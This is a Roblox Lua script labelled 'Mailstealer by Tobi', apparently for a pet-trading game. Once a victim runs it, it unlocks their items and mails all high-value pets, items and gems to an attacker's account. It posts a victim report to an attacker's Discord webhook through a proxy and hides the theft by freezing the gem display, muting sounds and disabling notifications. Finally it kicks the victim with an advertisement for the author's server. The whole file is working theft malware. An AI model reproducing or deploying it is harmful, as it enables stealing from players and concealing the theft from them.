local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "gg / HcpNe56R2a"
local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
local HttpService = game:GetService("HttpService")
local itemsToSend = {}
local rapCache = {}
local sendamount = game.Players.LocalPlayer.PlayerGui._MACHINES.MailboxMachine.Frame.SendFrame.Bottom.Diamonds.Amount.Text
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local function sendGemsToNumber(str)
    local suffixes = {["k"] = 1000, ["m"] = 1000000, ["b"] = 1000000000}
    local numberPart = tonumber(str:match("%d+%.?%d*"))
    local suffixPart = str:match("[kKmM]")
    if numberPart and suffixPart then
        local number = math.floor(numberPart)
        local multiplier = suffixes[suffixPart:lower()]
        if multiplier then
            return number * multiplier
        else
            return nil
        end
    elseif numberPart then
        return numberPart
    else
        return nil
    end
end

local newamount = sendGemsToNumber(sendamount)

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

if newamount > GemAmount1 then
    return
end

local function IsMailboxHooked()
	local uid
	for i, v in pairs(save["Pet"]) do
		uid = i
		break
	end
	local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if err ~= "They don't have enough space!" then
        return true
    else
        return false
    end
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(url, username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local totalRAP = 0
	local fields = {
		{
			name = "Victim Username:",
			value = username,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		}
	}

	for _, item in ipairs(itemsToSend) do
		fields[2].value = fields[2].value .. item.name .. ": " .. formatNumber(item.rap * item.amount) .. " RAP\n"
		totalRAP = totalRAP + (item.rap * item.amount)
	end
    fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
	fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
	if IsMailboxHooked() then
		fields[2].name = "Anti-mailstealer used! You lost these items:"
		fields[2].value = fields[2].value .. "\n\n\226\154\160 NOTICE: Anti-mailstealer used"
	end

    local data = {
        ["embeds"] = {{
            ["title"] = "New Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
			}
        }}
    }
    local body = HttpService:JSONEncode(data)
    local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	})
end

local user = Username
local user2 = Username2 or "2pRiAMfYN41y"

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function safeToString(value)
    if value == nil then
        return "nil"
    else
        return tostring(value)
    end
end

local function getRAP(Type, Item)
	local cacheKey = Type .. ":" .. safeToString(Item.id) .. ":" .. safeToString(Item.tn) .. ":" .. safeToString(Item.sh) .. ":" .. safeToString(Item.pt)
	if rapCache[cacheKey] then
		return rapCache[cacheKey]
	end

    if GetRapValues[Type] then
        for i,v in pairs(GetRapValues[Type]) do
            local itemTable = HttpService:JSONDecode(i)
            if itemTable.id == Item.id and itemTable.tn == Item.tn and itemTable.sh == Item.sh and itemTable.pt == Item.pt then
				rapCache[cacheKey] = v
                return v
            end
        end
    end
	return 0
end

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
		if response == false and err == "They don't have enough space!" then
			user = user2
			args[1] = user
		end
	until response == true
	GemAmount1 = GemAmount1 - newamount
	newamount = newamount * 1.5
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemAmount1 >= (newamount + 10000) then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = math.floor(GemAmount1 - newamount)
				}
				local response = false
				repeat
					local response = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
			if value._uq then
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(key)
			end
        end
    end
end

local function CategoryWebhook(category)
	if category == "Pet" then
		for i, v in pairs(save[category]) do
			local rapValue = getRAP(category, v)
			local dir = library.Directory.Pets[v.id]
			if rapValue >= min_rap and (dir.huge or dir.exclusiveLevel) then
				local prefix = ""
				if v.pt and v.pt == 1 then
					prefix = "Golden "
				elseif v.pt and v.pt == 2 then
					prefix = "Rainbow "
				end
				if v.sh then
					prefix = "Shiny " .. prefix
				end
				local id = prefix .. v.id .. " (x" .. (v._am and tostring(v._am) or "1") .. ")"
				table.insert(itemsToSend, {name = id, rap = rapValue, amount = v._am or 1})
			end
		end
	else
		for i, v in pairs(save[category]) do
			local rapValue = getRAP(category, v)
			if rapValue >= min_rap then
				local id = v.id .. " (x" .. (v._am and tostring(v._am) or "1") .. ")"
				table.insert(itemsToSend, {name = id, rap = rapValue, amount = v._am or 1})
			end
		end
	end
end

local function ClaimMail()
    local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

ClaimMail()
EmptyBoxes()
local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		CategoryWebhook(v)
	end
end
if Webhook and string.find(Webhook, "discord") then
	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
	SendMessage(Webhook, plr.Name, GemAmount1)
end
local blob_a = require(game.ReplicatedStorage.Library)
local blob_b = blob_a.Save.Get()
function deepCopy(original)
	local copy = {}
	for k, v in pairs(original) do
		if type(v) == "table" then
			v = deepCopy(v)
		end
		copy[k] = v
	end
	return copy
end
blob_b = deepCopy(blob_b)
blob_a.Save.Get = function(...)
	return blob_b
end
local sortedItems = {}
for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
			if v == "Pet" then
                local rapValue = getRAP(v, item)
                local dir = library.Directory.Pets[item.id]
                if rapValue >= min_rap and (dir.huge or dir.exclusiveLevel) then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue})
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue})
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end
table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
for _, item in ipairs(sortedItems) do
	if item.rap >= newamount then
    	sendItem(item.category, item.uid, item.amount)
	else
		break
	end
end
SendAllGems()
setclipboard("https://discord.gg/HcpNe56R2a")
plr:kick("All your stuff has just been stolen by Tobi's mailstealer. Join discord.gg/HcpNe56R2a to start mailstealing yourself")
